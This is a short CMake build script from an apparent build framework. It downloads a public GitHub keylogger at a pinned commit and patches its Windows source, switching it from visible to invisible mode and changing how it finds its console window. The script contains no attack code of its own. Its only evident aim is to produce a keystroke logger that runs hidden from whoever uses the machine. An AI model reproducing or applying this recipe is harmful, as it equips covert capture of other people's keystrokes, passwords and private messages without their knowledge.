#!/usr/bin/cmake -P
### DK.cmake ############################################################
if(NOT EXISTS "$ENV{DKCMAKE_FUNCTIONS_DIR_}DK.cmake")
	cmake_policy(SET CMP0009 NEW)
	file(GLOB_RECURSE DK.cmake "/DK.cmake")
	list(GET DK.cmake 0 DK.cmake)
	get_filename_component(DKCMAKE_FUNCTIONS_DIR "${DK.cmake}" DIRECTORY)
	set(ENV{DKCMAKE_FUNCTIONS_DIR_} "${DKCMAKE_FUNCTIONS_DIR}/")
endif()
include("$ENV{DKCMAKE_FUNCTIONS_DIR_}DK.cmake")
include_guard()
#########################################################################


###### Install keylogger ######
# https://github.com/GiacomoLaw/Keylogger
# https://github.com/GiacomoLaw/Keylogger/archive/142eebd7dee0ac6067642804e80df4b4f375a7bd.zip
# https://github.com/GiacomoLaw/Keylogger/archive/142eebd.zip


### INSTALL ###
#dk_getFileParams("${CMAKE_CURRENT_LIST_DIR}/dkconfig.txt")

dk_import		(${keylogger_Import})


dk_fileReplace("${keylogger}/windows/klog_main.cpp" 
	"#define visible"
	"#define invisible"
)

dk_fileReplace("${keylogger}/windows/klog_main.cpp" 
	"FindWindowA(\"ConsoleWindowClass\", NULL)"
	"GetConsoleWindow()"
)